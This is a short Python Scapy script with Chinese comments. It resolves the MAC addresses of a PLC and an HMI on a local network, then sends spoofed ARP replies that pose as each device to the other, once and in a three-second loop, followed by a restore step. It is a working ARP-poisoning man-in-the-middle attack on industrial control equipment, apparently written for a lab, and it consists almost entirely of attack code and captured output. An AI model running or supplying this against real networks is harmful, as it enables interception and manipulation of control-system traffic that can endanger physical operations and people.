from scapy.all import *

p = sr1(ARP(pdst="192.168.1.3"))
p.show()
###[ ARP ]###
#  hwtype    = Ethernet (10Mb)
#  ptype     = IPv4
#  hwlen     = 6
#  plen      = 4
#  op        = is-at
#  hwsrc     = e0:dc:a0:36:c0:7e    //PLC的MAC地址
#  psrc      = 192.168.1.3
#  hwdst     = 08:26:ae:33:ef:ba    //本机MAC地址
#  pdst      = 192.168.1.99
###[ Padding ]###
#     load      = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'


h = sr1(ARP(pdst="192.168.1.4"))
h.show()

###[ ARP ]###
#  hwtype    = Ethernet (10Mb)
#  ptype     = IPv4
#  hwlen     = 6
#  plen      = 4
#  op        = is-at
#  hwsrc     = e0:dc:a0:30:49:fa    //HMI的MAC地址
#  psrc      = 192.168.1.4
#  hwdst     = 08:26:ae:33:ef:ba    //本机MAC地址
#  pdst      = 192.168.1.99
###[ Padding ]###
#     load      = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'


##攻击，伪装成PLC
packet = ARP(psrc="192.168.1.3",    ##PLC的IP
            hwsrc="08:26:ae:33:ef:ba",  ##本机MAC
            pdst="192.168.1.4",         ##HMI的IP
            hwdst="e0:dc:a0:30:49:fa"  ##HMI的MAC
            )
send(packet,verbose=0)  ##单次发送
send(packet,inter=3,loop=1) ##每隔三秒循环发送

##攻击，伪装成HMI
packet = ARP(psrc="192.168.1.4",    ##HMI的IP
            hwsrc="08:26:ae:33:ef:ba",  ##本机MAC
            pdst="192.168.1.3",         ##PLC的IP
            hwdst="e0:dc:a0:36:c0:7e"  ##PLC的MAC
            )
send(packet,verbose=0)  ##单次发送
send(packet,inter=3,loop=1) ##每隔三秒循环发送


##复原
re = ARP(psrc="192.168.1.3",    ##PLC的IP
        hwsrc="e0:dc:a0:36:c0:7e",  ##PLC的MAC
        pdst="192.168.1.4",         ##HMI的IP
        hwdst="e0:dc:a0:30:49:fa"  ##HMI的MAC
        )
send(re,verbose=0) 

re2 = ARP(psrc="192.168.1.4",    ##PLC的IP
        hwsrc="e0:dc:a0:30:49:fa",  ##PLC的MAC
        pdst="192.168.1.3",         ##HMI的IP
        hwdst="e0:dc:a0:36:c0:7e"  ##HMI的MAC
        )
send(re2,verbose=0) 